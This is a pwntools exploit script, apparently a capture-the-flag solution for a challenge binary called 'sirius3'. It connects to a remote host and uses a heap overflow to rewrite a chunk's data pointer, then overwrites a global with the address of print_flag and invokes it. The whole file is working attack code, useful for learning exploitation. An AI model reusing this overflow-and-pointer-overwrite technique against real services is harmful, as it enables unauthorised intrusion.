#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

# Hardcoded addresses (from nm ./sirius3)
PRINT_FLAG = 0x401206
VICTIM = 0x404160

log.success(f"print_flag @ {hex(PRINT_FLAG)}")
log.success(f"victim @ {hex(VICTIM)}")

# Connect to remote server
p = remote('72.146.224.45', 6060)

# Helper functions
def alloc(size):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'size (decimal): ', str(size).encode())

def edit(idx, length, data):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendlineafter(b'bytes to write (decimal): ', str(length).encode())
    p.recvuntil(b'Enter data')
    p.send(data)

def invoke():
    p.sendlineafter(b'Choice: ', b'6')

# ========== EXPLOIT ==========
log.info("=== Starting Exploit ===")

# Allocate chunk 0
log.info("Step 1: Allocating chunk...")
alloc(0x40)

# Build overflow payload
log.info("Step 2: Building overflow payload...")
payload = b'A' * 0x40      # Fill data0 buffer
payload += p64(0)          # malloc prev_size
payload += p64(0x41)       # malloc size
payload += p64(0x40)       # chunk_t->size
payload += p64(VICTIM)     # chunk_t->data = &victim
payload += b'X' * 32       # chunk_t->name
payload += p32(1)          # chunk_t->in_use

# Send overflow
log.info("Step 3: Overflowing...")
edit(0, len(payload), payload)

# Write print_flag to victim
log.info("Step 4: Writing print_flag to victim...")
edit(0, 8, p64(PRINT_FLAG))

# Trigger win
log.info("Step 5: Invoking ritual!")
invoke()

p.interactive()
